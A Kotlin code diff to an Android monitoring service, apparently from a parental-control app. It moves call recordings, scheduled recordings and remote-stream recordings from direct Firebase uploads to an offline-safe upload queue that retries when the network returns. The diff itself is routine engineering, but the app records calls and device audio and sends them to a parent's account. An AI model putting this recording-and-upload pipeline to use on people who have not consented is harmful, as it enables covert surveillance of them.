@@ -102,6 +102,9 @@ class ChildForegroundService : Service() {
         networkMonitor = com.example.authapp.utils.NetworkHistoryMonitor(this).apply { startMonitoring() }
         com.example.authapp.receiver.SimChangeReceiver.checkAndSyncSimState(this)
 
+        // OFFLINE-FIRST: Network restore hone par pending recordings upload karo
+        startNetworkRestoreSync()
+
         try {
             batteryReceiver = com.example.authapp.receiver.BatteryStatusReceiver()
             val filter = android.content.IntentFilter().apply {
@@ -113,6 +116,32 @@ class ChildForegroundService : Service() {
             ContextCompat.registerReceiver(this, batteryReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
         } catch (e: Exception) {
             FirebaseCrashlytics.getInstance().log("[ChildService] BatteryReceiver register error: ${e.localizedMessage}")
+        }
+    }
+
+    /**
+     * Network wapas aane par pending uploads ka sync trigger karo.
+     * ConnectivityManager callback se real-time network change detect hota hai.
+     */
+    private fun startNetworkRestoreSync() {
+        try {
+            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return
+            val networkCallback = object : android.net.ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: android.net.Network) {
+                    super.onAvailable(network)
+                    // Internet restore hua — pending queue check karo
+                    if (!com.example.authapp.sync.PendingUploadQueue.isEmpty(applicationContext)) {
+                        FirebaseCrashlytics.getInstance().log(
+                            "[ChildService] Network restored — triggering pending upload sync (${com.example.authapp.sync.PendingUploadQueue.size(applicationContext)} items)"
+                        )
+                        com.example.authapp.sync.SyncScheduler.scheduleWorker(applicationContext)
+                    }
+                }
+            }
+            connectivityManager.registerDefaultNetworkCallback(networkCallback)
+            FirebaseCrashlytics.getInstance().log("[ChildService] Network restore sync listener registered")
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().log("[ChildService] Network callback register error: ${e.localizedMessage}")
         }
     }
 
@@ -504,25 +533,15 @@ class ChildForegroundService : Service() {
                     currentServiceState = "IDLE_PROTECTED"
                     AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                     if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
-                        FirebaseRepository.saveRecordingSession(
+                        // OFFLINE-FIRST: Net hai toh direct upload, nahi toh local save + WorkManager queue
+                        com.example.authapp.sync.SyncScheduler.enqueueUpload(
+                            context = applicationContext,
+                            file = recordedFile,
                             childId = uid,
                             streamType = "scheduled",
-                            durationSeconds = durationSec,
-                            localFilePath = recordedFile.absolutePath
-                        ) {
-                            try {
-                                FirebaseRepository.uploadRecordingFile(
-                                    childId = uid,
-                                    fileUri = android.net.Uri.fromFile(recordedFile),
-                                    streamType = "scheduled",
-                                    durationSeconds = durationSec,
-                                    localFilePath = recordedFile.absolutePath
-                                )
-                                FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording uploaded to Cloud History")
-                            } catch (e: Exception) {
-                                FirebaseCrashlytics.getInstance().recordException(e)
-                            }
-                        }
+                            durationSeconds = durationSec
+                        )
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording enqueued for upload (offline-safe)")
                     }
                     scheduledStopRunnable = null
                 }
@@ -569,56 +588,18 @@ class ChildForegroundService : Service() {
                         applicationContext,
                         "CALL_RECORDING",
                         "SUCCESS",
-                        "Call audio captured locally (${durationSec}s, ${recordedFile.length()} bytes). Starting Cloud sync."
+                        "Call audio captured locally (${durationSec}s, ${recordedFile.length()} bytes). Starting offline-safe Cloud sync."
                     )
-                    FirebaseRepository.saveRecordingSession(
+                    // OFFLINE-FIRST: Net hai → direct upload, nahi → queue + WorkManager
+                    com.example.authapp.sync.SyncScheduler.enqueueUpload(
+                        context = applicationContext,
+                        file = recordedFile,
                         childId = uid,
                         streamType = "call",
-                        durationSeconds = durationSec,
-                        localFilePath = recordedFile.absolutePath
-                    ) {
-                        try {
-                            val fileUri = Uri.fromFile(recordedFile)
-                            FirebaseRepository.uploadRecordingFile(
-                                childId = uid,
-                                fileUri = fileUri,
-                                streamType = "call",
-                                durationSeconds = durationSec,
-                                localFilePath = recordedFile.absolutePath,
-                                onSuccess = { session ->
-                                    AppHealthTelemetry.logDiagnostic(
-                                        applicationContext,
-                                        "CALL_RECORDING",
-                                        "SUCCESS",
-                                        "Call recording uploaded to Firebase Storage and synced to Parent History."
-                                    )
-                                    try {
-                                        if (session.storageUrl.isNotEmpty()) {
-                                            FirebaseRepository.attachRecordingUrlToLatestCallLog(uid, session.storageUrl)
-                                        }
-                                    } catch (_: Exception) {}
-                                    try { recordedFile.delete() } catch (_: Exception) {}
-                                },
-                                onFailure = { err ->
-                                    AppHealthTelemetry.logDiagnostic(
-                                        applicationContext,
-                                        "CALL_RECORDING",
-                                        "FAILED",
-                                        "Cloud upload failed: $err",
-                                        err
-                                    )
-                                }
-                            )
-                        } catch (e: Exception) {
-                            AppHealthTelemetry.logDiagnostic(
-                                applicationContext,
-                                "CALL_RECORDING",
-                                "FAILED",
-                                "Call upload error: ${e.localizedMessage}",
-                                e.localizedMessage
-                            )
-                        }
-                    }
+                        durationSeconds = durationSec
+                    )
+                    // Attach recording URL to call log when eventually uploaded (best-effort)
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Call recording enqueued for offline-safe upload")
                 } else {
                     AppHealthTelemetry.logDiagnostic(
                         applicationContext,
@@ -775,26 +756,15 @@ class ChildForegroundService : Service() {
                     val recordedFile = streamAudioRecorder?.stopRecording()
                     streamAudioRecorder = null
                     if (recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
-                        FirebaseRepository.saveRecordingSession(
+                        // OFFLINE-FIRST: Net hai toh direct upload, nahi toh queue
+                        com.example.authapp.sync.SyncScheduler.enqueueUpload(
+                            context = applicationContext,
+                            file = recordedFile,
                             childId = uid,
                             streamType = recType,
-                            durationSeconds = durationSec,
-                            localFilePath = recordedFile.absolutePath
-                        ) {
-                            try {
-                                val fileUri = Uri.fromFile(recordedFile)
-                                FirebaseRepository.uploadRecordingFile(
-                                    childId = uid,
-                                    fileUri = fileUri,
-                                    streamType = recType,
-                                    durationSeconds = durationSec,
-                                    localFilePath = recordedFile.absolutePath
-                                )
-                                FirebaseCrashlytics.getInstance().log("[ChildService] Uploaded remote stream recording successfully")
-                            } catch (e: Exception) {
-                                FirebaseCrashlytics.getInstance().recordException(e)
-                            }
-                        }
+                            durationSeconds = durationSec
+                        )
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Remote stream recording enqueued (offline-safe)")
                     }
                 }
             }
